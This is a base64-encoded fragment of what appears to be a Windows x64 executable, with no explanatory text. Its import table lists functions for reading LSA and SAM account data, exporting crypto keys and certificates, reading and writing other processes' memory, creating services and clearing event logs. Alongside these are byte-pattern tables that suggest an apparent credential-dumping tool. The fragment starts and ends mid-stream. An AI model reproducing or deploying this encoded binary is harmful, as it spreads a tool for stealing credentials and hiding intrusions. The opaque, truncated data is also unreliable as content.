AAAAADuqwIAAAAAAOSrAgAAAAAA2KsCAAAAAADMqwIAAAAAAMKrAgAAAAAAuKsCAAAAAADapgIAAAAAAPqmAgAAAAAADqcCAAAAAAAqpwIAAAAAAEKnAgAAAAAAWqcCAAAAAABqpwIAAAAAAH6nAgAAAAAAmqcCAAAAAACupwIAAAAAAManAgAAAAAA4KcCAAAAAADypwIAAAAAAAioAgAAAAAAHKgCAAAAAAAyqAIAAAAAAEqvAgAAAAAAAAAAAAAAAAB9AUxzYVF1ZXJ5SW5mb3JtYXRpb25Qb2xpY3kAdQFMc2FPcGVuUG9saWN5AFYBTHNhQ2xvc2UAAGcAQ3JlYXRlV2VsbEtub3duU2lkAABhAENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XAGAAQ3JlYXRlUHJvY2Vzc0FzVXNlclcAAPgBUmVnUXVlcnlWYWx1ZUV4VwAA8gFSZWdRdWVyeUluZm9LZXlXAADiAVJlZ0VudW1WYWx1ZVcA7QFSZWdPcGVuS2V5RXhXAN8BUmVnRW51bUtleUV4VwDLAVJlZ0Nsb3NlS2V5AD4AQ2xvc2VTZXJ2aWNlSGFuZGxlAACvAERlbGV0ZVNlcnZpY2UArgFPcGVuU0NNYW5hZ2VyVwAAsAFPcGVuU2VydmljZVcAAEwCU3RhcnRTZXJ2aWNlVwDEAVF1ZXJ5U2VydmljZVN0YXR1c0V4AABCAENvbnRyb2xTZXJ2aWNlAAA7AUlzVGV4dFVuaWNvZGUAUABDb252ZXJ0U2lkVG9TdHJpbmdTaWRXAACsAU9wZW5Qcm9jZXNzVG9rZW4AABoBR2V0VG9rZW5JbmZvcm1hdGlvbgBKAUxvb2t1cEFjY291bnRTaWRXAFgAQ29udmVydFN0cmluZ1NpZFRvU2lkVwAAlABDcnlwdEV4cG9ydEtleQAAhgBDcnlwdEFjcXVpcmVDb250ZXh0VwAAmgBDcnlwdEdldEtleVBhcmFtAACgAENyeXB0UmVsZWFzZUNvbnRleHQAkwBDcnlwdEVudW1Qcm92aWRlcnNXAJsAQ3J5cHRHZXRQcm92UGFyYW0AjABDcnlwdERlc3Ryb3lLZXkAnABDcnlwdEdldFVzZXJLZXkAqwFPcGVuRXZlbnRMb2dXAAQBR2V0TnVtYmVyT2ZFdmVudExvZ1JlY29yZHMAADoAQ2xlYXJFdmVudExvZ1cAAGUAQ3JlYXRlU2VydmljZVcAAEMCU2V0U2VydmljZU9iamVjdFNlY3VyaXR5AAAqAEJ1aWxkU2VjdXJpdHlEZXNjcmlwdG9yVwAAwgFRdWVyeVNlcnZpY2VPYmplY3RTZWN1cml0eQAAHQBBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAAOIARnJlZVNpZACZAENyeXB0R2V0SGFzaFBhcmFtAKIAQ3J5cHRTZXRLZXlQYXJhbQAAcAJTeXN0ZW1GdW5jdGlvbjAzMgBVAlN5c3RlbUZ1bmN0aW9uMDA1AJ8AQ3J5cHRJbXBvcnRLZXkAAGkCU3lzdGVtRnVuY3Rpb24wMjUAiABDcnlwdENyZWF0ZUhhc2gAiQBDcnlwdERlY3J5cHQAAIsAQ3J5cHREZXN0cm95SGFzaAAAZAFMc2FGcmVlTWVtb3J5AJ0AQ3J5cHRIYXNoRGF0YQCxAU9wZW5UaHJlYWRUb2tlbgBFAlNldFRocmVhZFRva2VuAAC0AER1cGxpY2F0ZVRva2VuRXgAADgAQ2hlY2tUb2tlbk1lbWJlcnNoaXAAAGwAQ3JlZEZyZWUAAGsAQ3JlZEVudW1lcmF0ZVcAAEFEVkFQSTMyLmRsbAAAcwBDcnlwdEFjcXVpcmVDZXJ0aWZpY2F0ZVByaXZhdGVLZXkARgBDZXJ0R2V0TmFtZVN0cmluZ1cAAFAAQ2VydE9wZW5TdG9yZQA8AENlcnRGcmVlQ2VydGlmaWNhdGVDb250ZXh0AAAEAENlcnRBZGRDZXJ0aWZpY2F0ZUNvbnRleHRUb1N0b3JlAAAPAENlcnRDbG9zZVN0b3JlAABBAENlcnRHZXRDZXJ0aWZpY2F0ZUNvbnRleHRQcm9wZXJ0eQApAENlcnRFbnVtQ2VydGlmaWNhdGVzSW5TdG9yZQAsAENlcnRFbnVtU3lzdGVtU3RvcmUAAwFQRlhFeHBvcnRDZXJ0U3RvcmVFeAAAQ1JZUFQzMi5kbGwABQBDRExvY2F0ZUNTeXN0ZW0ABgBDRExvY2F0ZUNoZWNrU3VtAAALAE1ENUZpbmFsAAANAE1ENVVwZGF0ZQAMAE1ENUluaXQAY3J5cHRkbGwuZGxsAABOAFBhdGhJc1JlbGF0aXZlVwAiAFBhdGhDYW5vbmljYWxpemVXACQAUGF0aENvbWJpbmVXAABTSExXQVBJLmRsbAAmAFNhbVF1ZXJ5SW5mb3JtYXRpb25Vc2VyAAYAU2FtQ2xvc2VIYW5kbGUAABQAU2FtRnJlZU1lbW9yeQATAFNhbUVudW1lcmF0ZVVzZXJzSW5Eb21haW4AIQBTYW1PcGVuVXNlcgAdAFNhbUxvb2t1cE5hbWVzSW5Eb21haW4AABwAU2FtTG9va3VwSWRzSW5Eb21haW4AAB8AU2FtT3BlbkRvbWFpbgAHAFNhbUNvbm5lY3QAABEAU2FtRW51bWVyYXRlRG9tYWluc0luU2FtU2VydmVyAAAYAFNhbUdldEdyb3Vwc0ZvclVzZXIALABTYW1SaWRUb1NpZAAbAFNhbUxvb2t1cERvbWFpbkluU2FtU2VydmVyAAAVAFNhbUdldEFsaWFzTWVtYmVyc2hpcABTQU1MSUIuZGxsAAAoAExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZQAAJQBMc2FGcmVlUmV0dXJuQnVmZmVyACMATHNhRGVyZWdpc3RlckxvZ29uUHJvY2VzcwAiAExzYUNvbm5lY3RVbnRydXN0ZWQAIQBMc2FDYWxsQXV0aGVudGljYXRpb25QYWNrYWdlAABTZWN1cjMyLmRsbAAHAENvbW1hbmRMaW5lVG9Bcmd2VwAAU0hFTEwzMi5kbGwABQBNRDRVcGRhdGUAAwBNRDRGaW5hbAAABABNRDRJbml0AGFkdmFwaTMyLmRsbAAAEABSdGxVbmljb2RlU3RyaW5nVG9BbnNpU3RyaW5nAAAKAFJ0bEZyZWVBbnNpU3RyaW5nAAIATnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAAAOAFJ0bEluaXRVbmljb2RlU3RyaW5nAAAJAFJ0bEVxdWFsVW5pY29kZVN0cmluZwABAE50UXVlcnlPYmplY3QADABSdGxHZXRDdXJyZW50UGViAAAAAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MADwBSdGxTdHJpbmdGcm9tR1VJRAALAFJ0bEZyZWVVbmljb2RlU3RyaW5nAAANAFJ0bEdldE50VmVyc2lvbk51bWJlcnMAAAMATnRSZXN1bWVQcm9jZXNzAAYAUnRsQWRqdXN0UHJpdmlsZWdlAAAEAE50U3VzcGVuZFByb2Nlc3MAAAUATnRUZXJtaW5hdGVQcm9jZXNzAAAIAFJ0bEVxdWFsU3RyaW5nAABudGRsbC5kbGwAjQNWaXJ0dWFsUHJvdGVjdAAAXQNTbGVlcADIAEZpbGVUaW1lVG9TeXN0ZW1UaW1lAABUAkxvY2FsQWxsb2MAAFgCTG9jYWxGcmVlAKsDV3JpdGVGaWxlALECUmVhZEZpbGUAAFkAQ3JlYXRlRmlsZVcA8QBGbHVzaEZpbGVCdWZmZXJzAABnAUdldEZpbGVTaXplRXgARAFHZXRDdXJyZW50RGlyZWN0b3J5VwAANgBDbG9zZUhhbmRsZQBFAUdldEN1cnJlbnRQcm9jZXNzAIICT3BlblByb2Nlc3MAcwFHZXRMYXN0RXJyb3IAAJYARHVwbGljYXRlSGFuZGxlAC8DU2V0TGFzdEVycm9yAACNAERldmljZUlvQ29udHJvbAAjA1NldEZpbGVQb2ludGVyAACPA1ZpcnR1YWxRdWVyeQAAkANWaXJ0dWFsUXVlcnlFeAAAtAJSZWFkUHJvY2Vzc01lbW9yeQCOA1ZpcnR1YWxQcm90ZWN0RXgAALQDV3JpdGVQcm9jZXNzTWVtb3J5AABkAk1hcFZpZXdPZkZpbGUAeANVbm1hcFZpZXdPZkZpbGUAWABDcmVhdGVGaWxlTWFwcGluZ1cAAGwAQ3JlYXRlUHJvY2Vzc1cAAEsBR2V0RGF0ZUZvcm1hdFcAAOMBR2V0VGltZUZvcm1hdFcAAMcARmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUA9QJTZXRDb25zb2xlQ3RybEhhbmRsZXIACQNTZXRDb25zb2xlT3V0cHV0Q1AAAA4DU2V0Q29uc29sZVRpdGxlVwAAYgNTeXN0ZW1UaW1lVG9GaWxlVGltZQAAygFHZXRTeXN0ZW1UaW1lAPsARnJlZUxpYnJhcnkAUQJMb2FkTGlicmFyeVcAAKIBR2V0UHJvY0FkZHJlc3MAAPkCU2V0Q29uc29sZUN1cnNvclBvc2l0aW9uAAC7AUdldFN0ZEhhbmRsZQAAywBGaWxsQ29uc29sZU91dHB1dENoYXJhY3RlclcAOgFHZXRDb25zb2xlU2NyZWVuQnVmZmVySW5mbwAASAFHZXRDdXJyZW50VGhyZWFkAABGAUdldEN1cnJlbnRQcm9jZXNzSWQAhAFHZXRNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAFoFd2NzcmNocgBRBXdjc2NocgAABwVfd2NzaWNtcAAACQVfd2NzbmljbXAAXAV3Y3NzdHIAAF8Fd2NzdG91bAD2AF9lcnJubwAA4AR2ZndwcmludGYAJwRmZmx1c2gAALEDX3dmb3BlbgBvAV9pb2IAACQEZmNsb3NlAAA6BGZyZWUAAHQDX3djc2R1cAAMAV9maWxlbm8AtwJfc2V0bW9kZQAAzQRzeXN0ZW0AAG1zdmNydC5kbGwAAIAEbWVtY3B5AACEBG1lbXNldAAAUwBfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAjwBfX3dnZXRtYWluYXJncwAAUgBfWGNwdEZpbHRlcgD/AF9leGl0ALMAX2NleGl0AAAgBGV4aXQAAGwBX2luaXR0ZXJtAKAAX2Ftc2dfZXhpdAAAggBfX3NldHVzZXJtYXRoZXJyAADEAF9jb21tb2RlAAAYAV9mbW9kZQAAgABfX3NldF9hcHBfdHlwZQAAEwRjYWxsb2MAAFQEaXNkaWdpdAB9BG1idG93YwAAewBfX21iX2N1cl9tYXgAAFYEaXNsZWFkYnl0ZQAAaQRpc3hkaWdpdAAAbQRsb2NhbGVjb252AAAwA191bmxvY2sA1QFfbG9jawC6Al9zbnByaW50ZgDGAV9pdG9hAAwFd2N0b21iAAB0BG1hbGxvYwAAJgRmZXJyb3IAAGAEaXN3Y3R5cGUAAAcFd2NzdG9tYnMAADAAP3Rlcm1pbmF0ZUBAWUFYWFoAlwRyZWFsbG9jAGUAX19iYWRpb2luZm8AfQBfX3Bpb2luZm8AlQJfcmVhZADeAV9sc2Vla2k2NADSA193cml0ZQAAcgFfaXNhdHR5ANsEdW5nZXRjAACJAk91dHB1dERlYnVnU3RyaW5nQQAA3gJSdGxWaXJ0dWFsVW53aW5kAADXAlJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAANACUnRsQ2FwdHVyZUNvbnRleHQAZQNUZXJtaW5hdGVQcm9jZXNzAAB1A1VuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAUQNTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAnwJRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgDhAUdldFRpY2tDb3VudAAASQFHZXRDdXJyZW50VGhyZWFkSWQAA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